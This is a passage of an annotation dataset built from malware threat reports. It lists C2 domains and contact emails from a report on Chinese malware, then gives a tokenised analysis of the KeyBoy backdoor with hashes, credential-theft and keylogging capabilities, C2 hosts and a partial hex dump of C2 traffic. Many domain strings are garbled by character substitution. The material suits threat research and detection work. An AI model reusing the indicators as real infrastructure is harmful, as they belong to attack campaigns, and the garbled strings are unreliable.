"paladin666.gicp.net", "paladin666.gicp.net", "xyxf110.3322.org", "sbwfn007.3322.org", "sbwfn007.3322.org", "freedom8964.ddns.info", "xyxf110.3322.org", "sbwfn007.3322.org", "heiantiankong.gicp.net", "xyxf110.3322.org", "csfox.3322.org", "sbwfn007.3322.org", "127.0.0.1", "zeropan007.3322.org"], ["zeropan007.3322.org"], ["123.151.192.105"], ["zfyxu.gicp.net", "hh-mr.gicp.net", "qq907433815.3322.org", "fun010.vicp.net", "axna.5166.info", "iamflying.vicp.net", "fun010.vicp.net", "paladin666.gicp.net", "tigertigertiger", "tigertigertiger.3322.org", "liyanyanzy.3322.org", "liyanyanzy.tk", "tb-20110112.3322.org", "liyanyanzy.3322.org", "yt.bodologetee.com", "127.0.0.1", "hqhaha.hk221.hqidc.net"], ["hqhaha.hk221.hqidc.net"], ["hqhaha.hk221.hqidc.net"], ["yangjinxiu.vicp.net", "127.0.0.1", "xiaoya.oicp.net"], ["zooosi.com", "veidu.uicp.net", "sunnyrone.coyo.eu", "23", "|", "T", "h"], ["e", "C", "h", "i", "n", "e", "s", "e", "M", "a", "l", "w", "a", "r", "e", "C", "o", "m", "p", "l", "e", "x", "e", "s", ":", "M", "a", "u", "d", "i", "xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["xfish@hotmail.com"], ["wugong@hotmail.com"], ["wugong@hotmail.com"], ["wugong@hotmail.com"], ["spring@hotmail.com"], ["spring@hotmail.com"], ["spring@hotmail.com"], ["spring@hotmail.com"], ["spring@hotmail.com"], ["spring@hotmail.com"], ["spring@hotmail.com"], ["spring@hotmail.com"], ["spring@hotmail.com"], ["spring@hotmail.com"], ["spring@hotmail.com"], ["spring@hotmail.com"], ["spring@hotmail.com"], ["spring@hotmail.com"], ["spring@hotmail.com"], ["spring@hotmail.com"], ["spring@hotmail.com"], ["spring@hotmail.com"], ["spring@hotmail.com"], ["spring@hotmail.com"], ["spring@hotmail.com"], ["qianming@CeleWare", "."], ["NET"], ["mogolsoft@Hotmail.com"], ["mogolsoft@Hotmail.com"], ["mogolsoft@Hotmail.com"], ["mogolsoft@Hotmail.com"], ["mogolsoft@Hotmail.com"], ["mogolsoft@Hotmail.com", "mogolsoft@Hotmail.com", "VerySign@CeleWare", "."], ["NET", "VerySign@CeleWare", "."], ["NET", "VerySign@CeleWare", "."], ["NET", "VerySign@CeleWare", "."], ["NET", "R3461", "xfish", "xfish", "mg", "xfish", "foxtt", "tuya", "R3461", "foxtt", "xfish"], ["T5888", "tuya", "xfish", "palad", "palad", "palad", "xfish", "hyrf", "hyrf", "WS", "xfish", "hyrf", "xfish", "xfish", "BoerS", "hyrf", "xfish", "new", "0912", "tibet", "CN", "xfish", "99999", "xmddd", "xfish", "1.730", "xmddd", "palad", "tige1", "tiger", "juesh", "tkkkk", "tb", "shenf", "nsc01", "xfish", "flg", "pdf", "zd", "12345", "xfish", "12345", "12345", "12345", "12345", "3461", "3460", "3460", "3460", "3460", "3460", "3460", "3461", "3460", "3460", "3460", "3460", "8080", "3460", "3460", "3460", "3460", "7975", "7975"], ["53", "3460", "7975", "3460", "3460", "3460", "7975", "3460", "8080", "80", "3460", "3460", "3460", "3460", "9090", "3460", "80", "9090", "3460", "80", "80", "80", "80", "3460", "80", "80", "80", "80", "80", "80", "80", "3460", "80", "80", "80", "80", "Norman", "Shark", "1855", "1st"], ["Ave", ".", ",", "Suite", "201", "San", "Diego", ",", "CA", "92101", "USA", "1.888.466.6267", "Strandveien", "37"], ["Lysaker", ",", "Norway"], ["+47.67.10.97.00", "24", "|", "T", "h", "e", "C", "h", "i", "n", "e", "s", "e", "M", "a", "l", "w", "a", "r", "e", "C", "o", "m", "p", "l", "e", "x", "e", "s", ":", "M", "a", "u", "d", "i", "www.normanshark.com"], ["Norman", "Shark", "Code5signing5certificate", "subscriptionTdyndnsEhomeTcom", "rabitTaumoniTcom", "dongdongHJITIIQQTorg", "myloverTdyndnsEfreeTcom", "Command4Control5domain", "hostnameTdyndnsEmailTcom", "catTaumoniTcom", "dnsabcdTdyndnsTbiz", "friendDJDTBBHHTorg"], ["indiaarmyTdjkccTcom", "IBDHDDDQDTgnwayTnet", "Malware5sample", "lQJJYlQJJYDTIIQQTorg"], ["qytianzhengTIIQQTorg", "YNK5JAPAN5Inc", "shinubiTchickenkillerTcom", "yhmQJJHJIIJTIIQQTorg"], ["bbsTavjkvTcom"], ["xcTwinniqiTcom", "dogTaumoniTcom", "olkATIIQQTorg"], ["tbVJDTcoTcc", "VVOQTvicpTcc", "xkTbuypnTcom", "limingliangDYVVTgnwayTnet"], ["wuliaoHBVTVVHHTorg", "northsinceThomelinuxTorg", "wangQIHVDIDTgnwayTnet", "yangjinxiuTvicpTnet", "sunnyroneTcoyoTeu", "IHJSE@hotmailTcom", "jiangQIHVDIDTIIQQTorg", "servicesTservebbsTorg", "pThannmaillTnet", "richEyongTgnwayTnet", "mailTlufareTcom"], ["yahooforusaTvicpTnet", "yzkkerTIIQQTorg", "QQJTDBOTDITQOJ", "veiduTuicpTnet", "IHJliveupdateTcom", "blackQJITblogdnsTcom"], ["surpriseingThomeftpTorg", "sThiinetTnet", "imacarpeTdyndnsTtv", "mysqlTsqlJDTcom", "DDBTAJTQIYTQJ", "wwwTwindowsliveupdatecacheTcom"], ["QyanfengjiaoxpTgicpTnet", "appleTbuypnTcom", "wwwTwindowsEliveupdateTcom", "kfcmakelcTzaptoTorg", "boyfriendDJDTkicksEassTorg", "sophiaTVVJJTorg", "qwerTcrabdanceTcom", "DataBase@HotmailTcom", "bmwTwebhopTnet", "blogTcnmgdTorg"], ["infasdTcrabdanceTcom"], ["whitebirdTdyndnsTorg"], ["SoftSign@HotMailTcom", "CeleSign@hotmailTcom"], ["newsTlufareTcom", "soft@hotmailTcom"], ["okiaTIIQQTorg"], ["oaTsanymhTcom", "leftpaperTdyndnsTbiz", "tigertigertigerTIIQQTorg", "cttwxswTgicpTnet", "JinDiQIAO@hotmailTcom", "wwwHTintarnetserviceTcom", "aOgDBmailTIIQQTorg", "mailTsufareTcom", "wangQIHVDIDTgicpTnet"], ["dongtaiwangTvicpTnet", "tbEQJDDJDDQTIIQQTorg", "tigertigertiger", "blackQJATdyndnsEworkTcom", "qqpassTkittyeahTcom", "qYAAHAQIHBTgicpTnet"], ["ytTbodologeteeTcom", "mogolsoft@HotmailTcom", "configureTselfipTorg"], ["QQQTDIATAQTHQ", "hostnameTwebhopTnet"], ["liyanyanzyTIIQQTorg", "fhTbuypnTcom", "missonTmysqDTnet"], ["liyanyanzyTtk", "managerTserveblogTnet", "singleTdyndnsTbiz", "stopQJATIIQQTorg", "worldnewsTzaptoTorg", "zeropanJJBTIIQQTorg", "dnsabcTwebhopTnet", "DDATQJQTQTVI", "qqYJBAIIVDOTIIQQTorg"], ["userQJDDTVVJJTorg", "dnsabcTIIQQTorg", "DBDJVVJAHTgnwayTorg", "DBDJVVJAHTgnwayTnet", "dynEmicrosoftTblogdnsTnet", "microsoft@hotmailTcom", "hhccIHOTzaptoTorg", "BQBHJYHYITgnwayTnet", "singleTdyndnsTinfo", "wqdfTIIQQTorg"], ["dnsxyzTdyndnsTbiz", "zfyxuTgicpTnet", "asiondragonQJJVTIIQQTorg", "gameTwinniqiTcom"], ["dnsluckTIIQQTorg", "yanfengjiaoxpTgicpTnet", "dnsxyzTwebhopTnet", "qwerTwekbyTcom"], ["DQITDODTDYITQIH", "smVVVTVVJJTorg", "dfHDDTgicpTnet", "yunlongDQITIIQQTorg", "bysexTmoooTcom", "DDVTDYATQIVTAI", "iamflyingTvicpTnet"], ["heiantiankongTgicpTnet", "spring@hotmailTcom", "funJDJTvicpTnet", "xiaoyaToicpTnet", "QJDQJOJV", "hhEmrTgicpTnet", "nsQTadultstickTcom", "DQITDODTDYQTDJO", "freedomVYHATddnsTinfo", "sbwfnJJBTIIQQTorg"], ["wangYVDQJJTIIQQTorg", "xyxfDDJTIIQQTorg"], ["zooosiTcom", "DI@CeleWareTNET", "bbaolongTvicpTnet", "wugong@hotmailTcom", "csfoxTIIQQTorg", "qianming@CeleWareTNET", "iamflyingTIIQQTorg", "xboyuTdlinkddnsTcom"], ["updatewinTIIQQTorg", "monalisaVVDVVTIIQQTorg", "micro@CeleWareTNET", "microsoft@CeleWareTNET", "VerySign@CeleWareTNET", "OYTOJTYYTVI"], ["xfish@hotmailTcom", "goodw@hotmailTcom", "wwwTmolEgovernmentTcom"], ["axnaTODHHTinfo", "paladinHHHTgicpTnet", "jiangshanQIHVDIDTIIQQTorg", "wwwTnewsyandexTcom", "hqhahaThkQQDThqidcTnet", "longDQIOTIIQQTorg", "asionEQJJYTgicpTnet", "wwwTzoneTqpoeTcom", "terryJBJBTvicpTcc", "laker@gmailTcom", "atnehTvicpTnet", "xyblack@gmailTcom", "bafeiteODVTvicpTnet"], ["The5Maudi5Infrastructure"]]}, {"vertexSet": [[{"name": "Vietnam", "pos": [5, 6], "sent_id": 0, "type": "ExploitTargetObject"}], [{"name": "India", "pos": [7, 8], "sent_id": 0, "type": "ExploitTargetObject"}], [{"name": "Vietnam", "pos": [14, 15], "sent_id": 2, "type": "ExploitTargetObject"}], [{"name": "India", "pos": [17, 18], "sent_id": 2, "type": "ExploitTargetObject"}], [{"name": "KeyBoy", "pos": [49, 50], "sent_id": 2, "type": "Malware"}], [{"name": "THAM luan- GD- NCKH2.doc", "pos": [8, 12], "sent_id": 5, "type": "File"}], [{"name": "MS12-060", "pos": [27, 30], "sent_id": 5, "type": "Vulnerability"}], [{"name": "THAM luan- GD- NCKH2.doc", "pos": [9, 13], "sent_id": 11, "type": "File"}], [{"name": "161c840748df9b49fda878394398425a", "pos": [16, 17], "sent_id": 11, "type": "MD5"}], [{"name": "e3cc84a4dc66e43453a039c3c983fcef92eafa7d", "pos": [18, 19], "sent_id": 11, "type": "SHA-1"}], [{"name": "5ba8c42807bee050aa474fe3c876936d196c65dca9895ccd2e317133188c905e", "pos": [20, 21], "sent_id": 11, "type": "SHA-256"}], [{"name": "dropper", "pos": [10, 11], "sent_id": 12, "type": "Dropper"}], [{"name": "1f4d22e5131a66aa24f44eb0d4f1b54d", "pos": [24, 25], "sent_id": 12, "type": "MD5"}], [{"name": "2c8a144331ec124755413f31a83e21015c74f2ec", "pos": [26, 27], "sent_id": 12, "type": "SHA-1"}], [{"name": "1c076413cca929b7004863f1a3992afda665786d6e179b9886ddeb8062194049", "pos": [1, 2], "sent_id": 13, "type": "SHA-256"}], [{"name": "CREDRIVER.dll", "pos": [10, 11], "sent_id": 15, "type": "Malware"}], [{"name": "2df60de8cb6b9fe7db1ea10581cfcda4", "pos": [4, 5], "sent_id": 16, "type": "MD5"}], [{"name": "fb8057595f2bb53331620c717775751df781c151", "pos": [6, 7], "sent_id": 16, "type": "SHA-1"}], [{"name": "ba4863d8a22864fa50a32aa85bc808371f05e8953167d34251cbd779d33e2d6d", "pos": [1, 2], "sent_id": 17, "type": "SHA-256"}], [{"name": "CVE-2012-0158", "pos": [6, 9], "sent_id": 19, "type": "Vulnerability"}], [{"name": "Calcutta", "pos": [18, 19], "sent_id": 21, "type": "ExploitTargetObject"}], [{"name": "India", "pos": [20, 21], "sent_id": 21, "type": "ExploitTargetObject"}], [{"name": "Amir Kumar Gupta", "pos": [13, 16], "sent_id": 23, "type": "Attacker"}], [{"name": "iafbsnl.doc", "pos": [0, 1], "sent_id": 24, "type": "File"}], [{"name": "dff54d302900e323c8988c725bbe2299", "pos": [4, 5], "sent_id": 24, "type": "MD5"}], [{"name": "c5c0bae48c326006b9dcc99855646d3be0b474c1", "pos": [6, 7], "sent_id": 24, "type": "SHA-1"}], [{"name": "1595ea659a87677c59a195a3aeec9e3ef135c808ec353222e8eaa662117c9362", "pos": [8, 9], "sent_id": 24, "type": "SHA-256"}], [{"name": "CREDRIVER.dll", "pos": [1, 2], "sent_id": 26, "type": "Malware"}], [{"name": "2b8c79678fa970ca4e229121e3de206f", "pos": [3, 4], "sent_id": 27, "type": "MD5"}], [{"name": "5e4b7268606d6c98d00874431d39c34971149200", "pos": [5, 6], "sent_id": 27, "type": "SHA-1"}], [{"name": "c22792dbf9a0279b36fa22f775a92ddfea9545cc842381ba84c2402c76aa393a", "pos": [1, 2], "sent_id": 28, "type": "SHA-256"}], [{"name": "April 1st 2013", "pos": [8, 11], "sent_id": 29, "type": "Time"}], [{"name": "C:\\WINDOWS\\system32\\CREDRIVER.dll", "pos": [11, 12], "sent_id": 33, "type": "Malware"}], [{"name": "Steal credentials from Internet Explorer", "pos": [0, 5], "sent_id": 37, "type": "MalwareCharacteristics"}], [{"name": "Steal credentials from Mozilla Firefox", "pos": [0, 5], "sent_id": 38, "type": "MalwareCharacteristics"}], [{"name": "Install a keylogger", "pos": [0, 3], "sent_id": 39, "type": "MalwareCharacteristics"}], [{"name": "Operate in an interactive mode", "pos": [0, 5], "sent_id": 40, "type": "MalwareCharacteristics"}], [{"name": "silence.phdns01.com", "pos": [18, 19], "sent_id": 47, "type": "Indicator"}], [{"name": "cpnet.phmail.us", "pos": [19, 20], "sent_id": 47, "type": "Indicator"}], [{"name": "imlang.phmail.org", "pos": [20, 21], "sent_id": 47, "type": "Indicator"}], [{"name": "cresy.zyns.com", "pos": [11, 12], "sent_id": 48, "type": "Indicator"}], [{"name": "preter.epac.to", "pos": [12, 13], "sent_id": 48, "type": "Indicator"}], [{"name": "backto.ddns.name", "pos": [13, 14], "sent_id": 48, "type": "Indicator"}], [{"name": "May 21st 2013", "pos": [25, 28], "sent_id": 51, "type": "Time"}], [{"name": "May 25th 2013", "pos": [28, 31], "sent_id": 51, "type": "Time"}], [{"name": "199.193.66.51", "pos": [31, 32], "sent_id": 51, "type": "Address"}], [{"name": "cpnet.phmail.us", "pos": [45, 46], "sent_id": 51, "type": "Indicator"}], [{"name": "May 10th 2013", "pos": [46, 49], "sent_id": 51, "type": "Time"}], [{"name": "May 24th 2013", "pos": [49, 52], "sent_id": 51, "type": "Time"}], [{"name": "199.193.66.51", "pos": [52, 53], "sent_id": 51, "type": "Address"}], [{"name": "imlang.phmail.org", "pos": [66, 67], "sent_id": 51, "type": "Indicator"}], [{"name": "May 22nd 2013", "pos": [67, 70], "sent_id": 51, "type": "Time"}], [{"name": "May 23rd 2013", "pos": [70, 73], "sent_id": 51, "type": "Time"}], [{"name": "199.193.66.51", "pos": [73, 74], "sent_id": 51, "type": "Address"}], [{"name": "vtt.phdns01.com", "pos": [87, 88], "sent_id": 51, "type": "Indicator"}], [{"name": "March 9th 2013", "pos": [88, 91], "sent_id": 51, "type": "Time"}], [{"name": "April 19th 2013", "pos": [91, 94], "sent_id": 51, "type": "Time"}], [{"name": "199.193.66.51", "pos": [94, 95], "sent_id": 51, "type": "Address"}], [{"name": "May 31st 2013", "pos": [0, 3], "sent_id": 52, "type": "Time"}], [{"name": "May 31st 2013", "pos": [3, 6], "sent_id": 52, "type": "Time"}], [{"name": "1.235.10.28", "pos": [6, 7], "sent_id": 52, "type": "Address"}], [{"name": "May 18th 2013", "pos": [0, 3], "sent_id": 53, "type": "Time"}], [{"name": "May 28th 2013", "pos": [3, 6], "sent_id": 53, "type": "Time"}], [{"name": "113.160.44.154", "pos": [6, 7], "sent_id": 53, "type": "Address"}], [{"name": "multiply with 0x69", "pos": [28, 31], "sent_id": 64, "type": "Obfuscation"}], [{"name": "KeyBoy", "pos": [15, 16], "sent_id": 147, "type": "Malware"}], [{"name": "Rapid7", "pos": [13, 14], "sent_id": 180, "type": "Organization"}]], "labels": [{"r": "P7", "h": 4, "t": 6, "evidence": [2, 5]}, {"r": "P21", "h": 5, "t": 4, "evidence": [2, 5]}, {"r": "P21", "h": 7, "t": 4, "evidence": [2, 11]}, {"r": "P21", "h": 8, "t": 4, "evidence": [2, 11]}, {"r": "P21", "h": 10, "t": 4, "evidence": [2, 11]}, {"r": "P21", "h": 9, "t": 4, "evidence": [2, 11]}, {"r": "P21", "h": 12, "t": 11, "evidence": [12]}, {"r": "P21", "h": 13, "t": 11, "evidence": [12]}, {"r": "P21", "h": 14, "t": 11, "evidence": [12, 13]}, {"r": "P21", "h": 16, "t": 15, "evidence": [15, 16]}, {"r": "P21", "h": 17, "t": 15, "evidence": [15, 16]}, {"r": "P21", "h": 18, "t": 15, "evidence": [15, 17]}, {"r": "P7", "h": 4, "t": 19, "evidence": [2, 19]}, {"r": "P21", "h": 28, "t": 27, "evidence": [26, 27]}, {"r": "P21", "h": 29, "t": 27, "evidence": [26, 27]}, {"r": "P21", "h": 30, "t": 27, "evidence": [26, 28]}, {"r": "P13", "h": 32, "t": 33, "evidence": [33, 37]}, {"r": "P13", "h": 32, "t": 34, "evidence": [33, 38]}, {"r": "P13", "h": 32, "t": 35, "evidence": [33, 39]}, {"r": "P13", "h": 32, "t": 36, "evidence": [33, 40]}, {"r": "P13", "h": 65, "t": 64, "evidence": [64, 147]}, {"r": "P21", "h": 37, "t": 65, "evidence": [47, 147]}, {"r": "P21", "h": 38, "t": 65, "evidence": [47, 147]}, {"r": "P21", "h": 39, "t": 65, "evidence": [47, 147]}, {"r": "P21", "h": 40, "t": 65, "evidence": [48, 147]}, {"r": "P21", "h": 41, "t": 65, "evidence": [48, 147]}, {"r": "P21", "h": 42, "t": 65, "evidence": [48, 147]}, {"r": "P21", "h": 50, "t": 65, "evidence": [51, 147]}, {"r": "P21", "h": 54, "t": 65, "evidence": [51, 147]}, {"r": "P33", "h": 65, "t": 43, "evidence": [51, 147]}, {"r": "P33", "h": 65, "t": 44, "evidence": [51, 147]}, {"r": "P33", "h": 65, "t": 47, "evidence": [51, 147]}, {"r": "P33", "h": 65, "t": 48, "evidence": [51, 147]}, {"r": "P33", "h": 65, "t": 51, "evidence": [51, 147]}, {"r": "P33", "h": 65, "t": 52, "evidence": [51, 147]}, {"r": "P33", "h": 65, "t": 55, "evidence": [51, 147]}, {"r": "P33", "h": 65, "t": 56, "evidence": [51, 147]}, {"r": "P33", "h": 65, "t": 58, "evidence": [52, 147]}, {"r": "P33", "h": 65, "t": 59, "evidence": [52, 147]}, {"r": "P33", "h": 65, "t": 61, "evidence": [53, 147]}, {"r": "P33", "h": 65, "t": 62, "evidence": [53, 147]}, {"r": "P28", "h": 65, "t": 45, "evidence": [51, 147]}, {"r": "P28", "h": 65, "t": 49, "evidence": [51, 147]}, {"r": "P28", "h": 65, "t": 53, "evidence": [51, 147]}, {"r": "P28", "h": 65, "t": 57, "evidence": [51, 147]}, {"r": "P28", "h": 65, "t": 60, "evidence": [52, 147]}, {"r": "P28", "h": 65, "t": 63, "evidence": [53, 147]}], "title": "201306Rapid7KeyBoy", "sents": [["KeyBoy", ",", "Targeted", "Attacks", "against", "Vietnam", "and", "India"], ["In", "our", "never", "-", "ending", "quest", "to", "spot", "and", "expose", "the", "nastiest", "of", "the", "Internet", ",", "me", "and", "Mark", "this", "time", "incidentally", "stepped", "into", "a", "targeted", "attacks", "campaign", "apparently", "directed", "at", "a", "distributed", "and", "diversified", "base", "of", "victims", "."], ["In", "this", "blog", "post", "we", "'ll", "analyze", "two", "specific", "incidents", "apparently", "targeting", "victims", "in", "Vietnam", "and", "in", "India", "and", "we", "'ll", "describe", "the", "capabilities", "of", "the", "custom", "backdoor", "being", "used", "that", "for", "convenience", "(", "and", "to", "our", "knowledge", ",", "for", "a", "lack", "of", "an", "existing", "name", ")", "we", "call", "KeyBoy", ",", "due", "to", "a", "string", "present", "in", "one", "of", "the", "samples", "."], ["We", "'ll", "describe", "how", "the", "attackers", "operate", "these", "backdoors", ",", "provide", "some", "scripts", "useful", "to", "further", "investigate", "the", "campaign", "as", "well", "as", "meanings", "to", "detect", "infections", "or", "scout", "for", "additional", "samples", "."], ["Exploits", "and", "Payloads"], ["We", "encountered", "the", "first", "document", "exploit", "called", "\"", "THAM", "luan-", "GD-", "NCKH2.doc", "\"", "a", "few", "days", "ago", ",", "which", "appears", "to", "be", "leveraging", "some", "vulnerabilities", "patched", "with", "MS12", "-", "060", "."], ["When", "opened", "with", "a", "vulnerable", "version", "of", "Microsoft", "Word", ",", "the", "exploit", "will", "initiate", "the", "infection", "routine", "and", "display", "the", "legitimate", "document", "that", "follows", ":"], ["This", "document", ",", "written", "in", "Vietnamese", ",", "appears", "to", "be", "reviewing", "and", "discussing", "best", "practices", "for", "teaching", "and", "researching", "scientific", "topics", "."], ["We", "have", "no", "knowledge", "on", "the", "identity", "of", "the", "target", ",", "but", "we", "can", "assume"], ["he", "might", "part", "of", "the", "Vietnamese", "academic", "community", "."], ["The", "document", "is", "named", "to", "Nguyen", "Anh", "Tuan", ",", "which", "is", "presented", "as", "author", "of", "this", "crafted", "text", "."], ["Following", "are", "the", "hashes", "of", "the", "exploit", "file", ":", "THAM", "luan-", "GD-", "NCKH2.doc", "Hash", "Value", "MD5", "161c840748df9b49fda878394398425a", "SHA1", "e3cc84a4dc66e43453a039c3c983fcef92eafa7d", "SHA256", "5ba8c42807bee050aa474fe3c876936d196c65dca9895ccd2e317133188c905e", "SHA512", "30bb6c3bcb797b8ebe5ab4bef59173ba358ea6713ea26cbc0147c37b99a54eca62f09475299a44c3"], ["98679f84fa87dc6dff084a185543945f123fb34236fa825b", "When", "executed", "the", "exploit", "initially", "creates", "and", "launches", "a", "dropper", "at", "location", "%", "Temp%\\svchost.exe", "with", "the", "following", "hashes", ":", "svchost.exe", "Hash", "Value", "MD5", "1f4d22e5131a66aa24f44eb0d4f1b54d", "SHA1", "2c8a144331ec124755413f31a83e21015c74f2ec"], ["SHA256", "1c076413cca929b7004863f1a3992afda665786d6e179b9886ddeb8062194049", "SHA512", "6a73333ca96ce0db7fa62eec34987070b823d95618e9c5e36ac0486927270794790d957ebc40c513"], ["23941ed22acded5ecfa3e9acd88f2c66a6619fa6793231ea"], ["This", "payload", "then", "creates", "a", "DLL", "file", "in", "system32", "called", "CREDRIVER.dll", ",", "which", "is", "in", "fact", "the", "actual", "backdoor", ":"], ["CREDRIVER.dll", "Hash", "Value", "MD5", "2df60de8cb6b9fe7db1ea10581cfcda4", "SHA1", "fb8057595f2bb53331620c717775751df781c151"], ["SHA256", "ba4863d8a22864fa50a32aa85bc808371f05e8953167d34251cbd779d33e2d6d", "SHA512", "5907c682e1cce4ce2aae3a165abefd40e7de4c4befefe895204ee59f9efd11ef75f894cd535597fe"], ["698de80f6ee4e361234c96a0454c490b4faa69869191ed81"], ["We", "also", "identified", "another", "document", "exploiting", "CVE-2012", "-", "0158", ",", "but", "this", "time", "apparently", "targeting", "some", "Indian", "individuals", "."], ["The", "content", "of", "the", "document", "is", "the", "following", ":"], ["This", "time", "the", "bait", "appears", "to", "be", "related", "to", "the", "state", "of", "telecommunication", "infrastructure", "in", "the", "district", "of", "Calcutta", "in", "India", ",", "discussing", "the", "coverage", "of", "GSM", "networks", "and", "availability", "and", "stability", "of", "broadband", "connections", "."], ["Also", "for", "this", "intrusion", "we", "ca", "n't", "know", "the", "identity", "of", "the", "target", ",", "but", "our", "hypothesis", "is", "either", "someone", "in", "the", "telecommunications", "industry", "or", "a", "representative", "of", "the", "local", "government", "."], ["In", "this", "case", "this", "crafted", "document", "pretends", "to", "be", "authored", "by", "someone", "called", "Amir", "Kumar", "Gupta", "."], ["iafbsnl.doc", "Hash", "Value", "MD5", "dff54d302900e323c8988c725bbe2299", "SHA1", "c5c0bae48c326006b9dcc99855646d3be0b474c1", "SHA256", "1595ea659a87677c59a195a3aeec9e3ef135c808ec353222e8eaa662117c9362"], ["SHA512", "6568f1f054c56716506ea2acdfb60919cc55f3da4ef05dee88925b6ccb835ad471e7d0d3e61befca"], ["8b7d320c08ee7ba96322c127329c6f94bfb288eeb9c6a0c5", "CREDRIVER.dll"], ["Hash", "Value", "MD5", "2b8c79678fa970ca4e229121e3de206f", "SHA1", "5e4b7268606d6c98d00874431d39c34971149200"], ["SHA256", "c22792dbf9a0279b36fa22f775a92ddfea9545cc842381ba84c2402c76aa393a", "SHA512", "0b064bad3a237734cf74f587a573a79949c79f8922df444ac7d73474d5cab739b495036624a3b907"], ["b18acb276ac5f8c777d4565bbba8e615212a2aedbc54f95e", "All", "backdoors", "appear", "to", "be", "compiled", "on", "April", "1st", "2013", ",", "suggesting", "that", "the", "attacks", "are", "reasonably", "recent", "."], ["Analysis", "of", "the", "Backdoor"], ["For", "the", "sake", "of", "this", "analysis", "we", "'ll", "take", "the", "Vietnamese", "backdoor", "as", "an", "example", ";", "the", "one", "found", "in", "the", "Indian", "attack", "operates", "in", "the", "exact", "same", "way", "."], ["As", "mentioned", ",", "when", "the", "exploit", "is", "opened", "a", "dropper", "is", "created", "and", "launched", ",", "which", "then", "takes", "care", "of", "creating", "a", "Windows", "service", "called", "MdAdum", ",", "which", "is", "then", "visible", "in", "the", "registry", "as", "follows", ":"], ["The", "dropper", "then", "launches", "the", "service", "with", "the", "DLL", "located", "at", "C:\\WINDOWS\\system32\\CREDRIVER.dll", "and", "deletes", "itself", "."], ["Resilience", "on", "the", "system", "is", "guaranteed", "by", "the", "use", "of", "such", "service", "which", "will", "be", "executed", "at", "every", "start", "up", "."], ["Note", "that", "the", "Indian", "attack", "does", "not", "make", "use", "of", "this", "middle", "-", "stage", "dropper", ",", "but", "directly", "installs", "and", "launches", "the", "Windows", "service", "instead", "."], ["This", "backdoor", "has", "several", "features", "including", ":", "1", "."], ["Steal", "credentials", "from", "Internet", "Explorer", "2", "."], ["Steal", "credentials", "from", "Mozilla", "Firefox", "3", "."], ["Install", "a", "keylogger", "for", "intercepting", "credentials", "on", "Google", "Chrome", "4", "."], ["Operate", "in", "an", "interactive", "mode", "to", "allow", "the", "attacker", "to", "perform", "additional", "investigation", "on", "the", "compromised", "system", "and", "exfiltrate", "data", "."], ["Following", "you", "can", "see", "the", "portion", "of", "the", "code", "where", "the", "backdoor", ",", "after", "having", "verified", "which", "version", "of", "Mozilla", "Firefox", "is", "installed", "on", "the", "system", ",", "decides", "which", "technique", "to", "use", "to", "recover", "the", "credentials", "from", "the", "browser", "'s", "local", "storage", "."], ["In", "older", "versions", "of", "Firefox", ",", "credentials", "were", "stored", "in", "several", ".txt", "files", "in", "%", "AppData%\\Mozilla\\Firefox", ",", "while", "in", "most", "recent", "ones", "they", "are", "stored", "in", "a", "SQLite", "database", "."], ["In", "the", "following", "snipped", "you", "see", "the", "SQL", "statement", "to", "extract", "the", "data", ":", "Just", "in", "the", "same", "way", ",", "the", "backdoor", "attempts", "to", "collect", "password", "autocomplete", "from", "Internet", "Explorer", ":"], ["The", "backdoor", "also", "creates", "a", "separate", "thread", "that", "installs", "a", "Windows", "hook", "procedure", "on", "message"], ["WH_KEYBOARD_LL", ",", "through", "which", "it", "can", "intercept", "keystrokes", "."], ["We", "believe", "this", "is", "mainly", "used", "to", "intercept", "credentials", "from", "other", "browsers", ",", "specifically", "Google", "Chrome", ":", "Analysis", "of", "the", "Protocol"], ["The", "backdoor", "tries", "to", "contact", "the", "following", "domains", "until", "it", "gets", "a", "response", "from", "an", "active", "one", ":", "silence.phdns01.com", "cpnet.phmail.us", "imlang.phmail.org"], ["The", "Indian", "backdoor", "tries", "to", "contact", "the", "following", "domains", "instead", ":", "cresy.zyns.com", "preter.epac.to", "backto.ddns.name"], ["In", "the", "first", "set", "of", "domains", "they", "are", "either", "registered", "with", "Whois", "proxy", "services", "or", "with", "fake", "identities", "."], ["In", "the", "second", "set", "they", "are", "making", "use", "of", "a", "dynamic", "DNS", "service", "by", "ChangeIP.com", "."], ["Following", "are", "traces", "collected", "from", "passive", "DNS", "data", "relevant", "to", "the", "hosts", "involved", "in", "these", "attacks", ":", "Domain", "First", "Seen", "Last", "Seen", "IPs", "ASN", "silence.phdns01.com", "May", "21st", "2013", "May", "25th", "2013", "199.193.66.51", "(", "TTL", ":", "1800", ")", "6939", "-", "HURRICANE", "-", "Hurricane", "Electric", ",", "Inc.", "cpnet.phmail.us", "May", "10th", "2013", "May", "24th", "2013", "199.193.66.51", "(", "TTL", ":", "1800", ")", "6939", "-", "HURRICANE", "-", "Hurricane", "Electric", ",", "Inc.", "imlang.phmail.org", "May", "22nd", "2013", "May", "23rd", "2013", "199.193.66.51", "(", "TTL", ":", "1800", ")", "6939", "-", "HURRICANE", "-", "Hurricane", "Electric", ",", "Inc.", "vtt.phdns01.com", "March", "9th", "2013", "April", "19th", "2013", "199.193.66.51", "(", "TTL", ":", "1800", ")", "6939", "-", "HURRICANE", "-", "Hurricane", "Electric", ",", "Inc.", "preter.epac.to"], ["May", "31st", "2013", "May", "31st", "2013", "1.235.10.28", "(", "TTL", ":", "30", ")", "9318", "-", "HANARO", "-", "AS", "Hanaro", "Telecom", "Inc.", "preter.epac.to"], ["May", "18th", "2013", "May", "28th", "2013", "113.160.44.154"], ["(", "TTL", ":", "30", ")", "45899", "-", "VNPT", "-", "AS", "-", "VN", "VNPT", "Corp"], ["This", "is", "an", "initial", "request", "that", "the", "backdoor", "would", "send", "out", "on", "port", "443", "to", "an", "active", "C&C", ":", "00000000", "c4", "4c", "87", "3f", "11", "1e", "c4", "1a", "2c", "a9", "12", "1a", "19", "61", "82", "de", "|.L.?", "....", ",", "....", "a", "..", "|", "00000010", "19", "26", "f8", "de", "bd", "26", "de", "19", "b0", "19", "1a"], ["95", "a1", "dd", "2b", "6d", "|.&", "...", "&", "........"], ["+m|", "00000020"], ["c2", "1a", "82", "b0", "19", "eb", "47", "b0", "26", "47", "b0", "26", "20", "82", "eb", "ca", "|", "......", "G.&G.", "&", "...", "|", "00000030", "bd", "26", "ca", 